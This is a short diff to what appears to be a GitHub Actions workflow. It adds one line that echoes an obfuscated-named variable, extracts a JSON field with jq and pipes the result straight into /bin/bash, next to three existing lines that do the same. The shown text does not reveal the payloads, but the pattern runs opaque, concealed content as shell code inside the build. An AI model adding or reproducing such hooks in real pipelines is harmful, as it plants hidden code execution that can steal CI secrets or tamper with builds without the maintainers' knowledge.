@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$n07" | jq -r .xp3243 | /bin/bash
           printf '%s' "$jgbfa40" | jq -r .wn176 | /bin/bash
           printf '%s' "$wbt442" | jq -r .ik1040 | /bin/bash
+          echo $ugq1341 | jq -r .mw2 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
